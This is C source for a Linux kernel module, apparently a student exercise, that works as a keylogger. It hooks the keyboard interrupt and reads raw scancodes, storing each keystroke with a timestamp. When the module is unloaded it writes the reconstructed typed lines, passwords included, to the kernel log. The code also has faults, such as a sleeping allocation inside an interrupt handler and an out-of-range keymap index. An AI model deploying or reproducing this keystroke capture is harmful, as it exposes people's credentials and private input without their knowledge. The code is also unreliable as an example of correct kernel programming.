#include "keylog.h"
#include "keymap.h"


#define KEYBOARD_IRQ 1
#define BUF_SIZE PAGE_SIZE
/*
static struct s_stroke {
	unsigned char		key;
	unsigned char		state;
	char			name[25];
	char			value;
	struct tm		time;
	struct list_head	stroke_lst;
};

struct keyboard_map {
  int   key;
  int   ascii;
  char  str[25];
  int   ascii_shift;
  char  shift_str[25];
};

*/
struct list_head head_stroke_lst_head;
char	line[BUF_SIZE];
LIST_HEAD(head_stroke_lst);
/*
static int	chr_open(struct inode *node, struct file *file)
{
	return 0;
}

static int	chr_release(struct inode *node, struct file *file)
{
	return 0;
}

static ssize_t	chr_read(struct file *file, char __user *user,
			 size_t size, loff_t *offset)
{
	return simple_read_from_buffer(user, size, offset, user, size);
}

static struct file_operations const ops = {
	.read = chr_read,
};

static struct miscdevice misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "module_keyboard",
	.fops = &ops
};
*/
static irqreturn_t keyboard_handler (int irq, void *dev_id)
{
	static unsigned char scancode;
	struct s_stroke		*new;
	struct timespec ts;

	getnstimeofday(&ts);
	new = kmalloc(sizeof(struct s_stroke), GFP_KERNEL);
	if (new) {
		scancode = inb (0x60);
		memset(new->name, 0, 25);
		memmove(new->name, keyboard_mapping[(scancode & 0x7f) - 1].str,
			strlen(keyboard_mapping[(scancode & 0x7f) - 1].str));
		//pr_err("new: %s\n", new->name);
		if (scancode & 0x80)
			new->state = 1;
		else
			new->state = 0;
		new->key =  scancode & 0x7f;
		new->value = keyboard_mapping[(scancode & 0x7f) - 1].ascii;
		time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
		list_add(&new->stroke_lst, &head_stroke_lst);
	}	
	return IRQ_HANDLED;
}

static int __init keyboard_irq_init(void)
{
	int ret;
//	int result;

//	result = misc_register(&misc);
//	if (result < 0) {
//		pr_err("chr register failed for the driver.\n");
//		return -1;
//	}
	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			"keyboard", (void *)keyboard_handler);
	if (ret) {
		pr_err("can't get shared interrupt for keyboard\n");
		return -1;
	}
	printk (KERN_ERR "init okay!\n");
	return 0;
}

static void __exit keyboard_irq_exit(void)
{
	struct s_stroke		*strokes = NULL;
//	char			*state;
	char			buffer[80];
	char			first = 1;

	memset(buffer, 0, 80);
	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		if (strokes->state) {
			if (first) {
				snprintf(buffer, 80, "%i:%i:%i: ",
					strokes->time.tm_hour,
					strokes->time.tm_min,
					strokes->time.tm_sec);
				strncat(line, buffer, 80);
				memset(buffer, 0, 80);
				first = 0;
			}
			if (isprint(strokes->value)) {
				line[strlen(line)] = strokes->value;
			}
			else if (strokes->value == 13) {
				pr_err("%s\n", line);
				memset(line, 0, PAGE_SIZE);
				first = 1;
			}
		}
		kfree(strokes);
	}
//	misc_deregister(&misc);
	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
